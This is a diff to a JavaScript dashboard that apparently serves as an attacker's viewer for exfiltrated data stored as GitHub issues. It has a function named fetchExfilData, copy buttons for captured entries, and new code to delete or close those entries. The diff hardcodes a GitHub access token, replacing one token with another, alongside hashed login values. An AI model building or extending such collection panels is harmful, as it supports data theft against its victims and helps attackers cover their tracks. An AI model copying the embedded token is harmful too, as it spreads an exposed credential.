@@ -3,7 +3,7 @@
 
     const HASH_USER = '0ca1574299693aaeb821647cf4c897a153bea29fafb12db28257a1ed61ce58d0';
     const HASH_PASS = '7ef461cec5e3f823e0724d62cb57b46e875a8690f1c1917c4d773cb2cb5a86ed';
-    const GITHUB_TOKEN = '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';
+    const GITHUB_TOKEN = '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';
     const REPO = 'va1uxxx/0xB0';
     const API_URL = `https://api.github.com/repos/${REPO}/issues`;
 
@@ -98,9 +98,15 @@
                 els.logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-inbox"></i> NO DATA RECEIVED</div>`;
                 return;
             }
-            const sorted = issues.slice().reverse();
+            // Filter open issues only
+            const openIssues = issues.filter(i => i.state === 'open');
+            if (openIssues.length === 0) {
+                els.logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-check-circle"></i> ALL CLEAR (no open issues)</div>`;
+                return;
+            }
+            const sorted = openIssues.slice().reverse();
             let html = '';
-            sorted.forEach((issue, index) => {
+            sorted.forEach((issue) => {
                 const title = escapeHtml(issue.title || 'Untitled');
                 const time = new Date(issue.created_at).toLocaleString();
                 const issueNumber = issue.number;
@@ -136,7 +142,6 @@
             });
             els.logContainer.innerHTML = html;
 
-            // Copy buttons
             document.querySelectorAll('.copy-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
                     const text = this.getAttribute('data-copy');
@@ -148,12 +153,11 @@
                 });
             });
 
-            // Delete buttons
             document.querySelectorAll('.delete-btn').forEach(btn => {
                 btn.addEventListener('click', function() {
                     const issueNum = parseInt(this.getAttribute('data-issue'));
-                    if (confirm(`Delete issue #${issueNum}?`)) {
-                        deleteIssue(issueNum);
+                    if (confirm(`Delete/Close issue #${issueNum}?`)) {
+                        deleteOrCloseIssue(issueNum);
                     }
                 });
             });
@@ -163,56 +167,64 @@
         }
     }
 
-    // Delete a single issue
-    async function deleteIssue(issueNumber) {
+    // Try DELETE first, fallback to CLOSE
+    async function deleteOrCloseIssue(issueNumber) {
         const url = `https://api.github.com/repos/${REPO}/issues/${issueNumber}`;
+        const headers = {
+            'Authorization': `token ${GITHUB_TOKEN}`,
+            'Accept': 'application/vnd.github.v3+json',
+            'Content-Type': 'application/json'
+        };
+
+        // Attempt DELETE
         try {
-            const response = await fetch(url, {
-                method: 'DELETE',
-                headers: {
-                    'Authorization': `token ${GITHUB_TOKEN}`,
-                    'Accept': 'application/vnd.github.v3+json'
-                }
-            });
-            if (!response.ok) {
-                const errorText = await response.text();
-                throw new Error(`HTTP ${response.status}: ${errorText}`);
+            const delRes = await fetch(url, { method: 'DELETE', headers });
+            if (delRes.ok) {
+                alert(`Issue #${issueNumber} deleted successfully.`);
+                fetchExfilData();
+                return;
             }
-            alert(`Issue #${issueNumber} deleted.`);
-            fetchExfilData(); // refresh
+            // If 403/404, try CLOSE instead
+            if (delRes.status === 403 || delRes.status === 404 || delRes.status === 401) {
+                console.warn(`DELETE failed (${delRes.status}), attempting CLOSE.`);
+                const closeRes = await fetch(url, {
+                    method: 'PATCH',
+                    headers,
+                    body: JSON.stringify({ state: 'closed' })
+                });
+                if (closeRes.ok) {
+                    alert(`Issue #${issueNumber} closed (moved to archive).`);
+                    fetchExfilData();
+                    return;
+                } else {
+                    const errText = await closeRes.text();
+                    alert(`CLOSE failed: HTTP ${closeRes.status} - ${errText}`);
+                }
+            } else {
+                const errText = await delRes.text();
+                alert(`DELETE failed: HTTP ${delRes.status} - ${errText}`);
+            }
         } catch (err) {
-            alert(`Delete failed: ${err.message}`);
+            alert(`Error: ${err.message}`);
         }
     }
 
-    // Delete all issues
     async function deleteAllIssues() {
-        if (!confirm('Delete ALL issues? This cannot be undone.')) return;
+        if (!confirm('Delete/Close ALL open issues? This cannot be undone.')) return;
         const els = getElements();
         if (!els.logContainer) return;
         const entries = els.logContainer.querySelectorAll('.entry');
         if (entries.length === 0) {
-            alert('No issues to delete.');
+            alert('No open issues to delete.');
             return;
         }
         const issueNumbers = Array.from(entries).map(entry => parseInt(entry.dataset.issue));
         let deleted = 0;
         for (const num of issueNumbers) {
-            try {
-                const url = `https://api.github.com/repos/${REPO}/issues/${num}`;
-                const response = await fetch(url, {
-                    method: 'DELETE',
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Accept': 'application/vnd.github.v3+json'
-                    }
-                });
-                if (response.ok) deleted++;
-            } catch (e) {
-                console.error(`Failed to delete #${num}`, e);
-            }
+            await deleteOrCloseIssue(num);
+            deleted++;
         }
-        alert(`Deleted ${deleted} out of ${issueNumbers.length} issues.`);
+        alert(`Processed ${deleted} issues. Refresh to see remaining.`);
         fetchExfilData();
     }
 
